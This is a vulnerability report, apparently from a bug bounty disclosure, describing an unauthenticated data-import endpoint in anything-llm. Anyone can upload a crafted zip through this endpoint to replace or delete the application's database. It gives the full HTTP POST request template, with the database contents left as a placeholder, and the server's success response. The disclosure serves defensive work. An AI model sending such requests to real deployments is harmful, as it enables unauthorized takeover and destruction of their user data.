Title: Anonymous access to import endpoint leads to anythingllm.db deletion/spoofing in mintplex-labs/anything-llm

Proof of Concept: 
Let's suppose that we have following list of accounts in the application:

Unauthorized, anonymous attacker (without account in the application) is able to import its own database file with following HTTP request:

POST /api/system/data-import HTTP/1.1
Host: localhost:3001
Content-Type: multipart/form-data; boundary=---------------------------33395526712532357982198249216
Content-Length: 5181

-----------------------------33395526712532357982198249216
Content-Disposition: form-data; name="file"; filename="bad.zip"
Content-Type: application/zip

PK
[ANYTHINGLLM DATABASE FILE IN HEX]

HTTP response:

HTTP/1.1 200 OK
[...]
{"success":true,"error":null}

As a result, the attacker imported his own database file. When container will be rebuilded (i.e., sudo docker compose up -d --build), attacker's database file will be used as new database file. After conducting the attack and rebuilding the container, the list of accounts has been altered in accordance with the attacker's file:

Impact: 
This vulnerability allows an unauthorized attacker to delete or spoof anythingllm.db database file.
